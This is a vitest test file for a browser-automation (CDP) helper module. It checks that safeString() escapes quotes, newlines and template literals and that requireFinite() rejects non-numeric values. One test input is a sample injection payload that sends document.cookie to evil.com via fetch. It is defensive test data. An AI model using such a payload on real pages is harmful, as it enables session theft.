import { describe, it, expect } from "vitest";
import { safeString, requireFinite } from "./connection.js";

describe("CDP connection utilities", () => {
  describe("safeString() — CDP injection prevention", () => {
    it("wraps normal strings in double quotes", () => {
      expect(safeString("hello")).toBe('"hello"');
    });

    it("escapes double quotes", () => {
      expect(safeString('test"injection')).toBe('"test\\"injection"');
    });

    it("neutralizes template literals", () => {
      const result = safeString("${alert(1)}");
      expect(JSON.parse(result)).toBe("${alert(1)}");
    });

    it("escapes newlines", () => {
      const result = safeString("line1\nline2");
      expect(result).not.toContain("\n");
      expect(result).toContain("\\n");
    });

    it("prevents classic CDP injection payload", () => {
      const payload = "'); fetch('https://evil.com/steal?c=' + document.cookie); ('";
      const result = safeString(payload);
      expect(JSON.parse(result)).toBe(payload);
    });
  });

  describe("requireFinite() — numeric validation", () => {
    it("passes finite numbers through", () => {
      expect(requireFinite(42, "test")).toBe(42);
      expect(requireFinite(3.14, "test")).toBe(3.14);
    });

    it("rejects NaN", () => {
      expect(() => requireFinite(NaN, "price")).toThrow(/price must be a finite number/);
    });

    it("rejects Infinity", () => {
      expect(() => requireFinite(Infinity, "time")).toThrow(/time must be a finite number/);
    });

    it("rejects non-numeric strings", () => {
      expect(() => requireFinite("abc", "value")).toThrow(/value must be a finite number/);
    });
  });
});
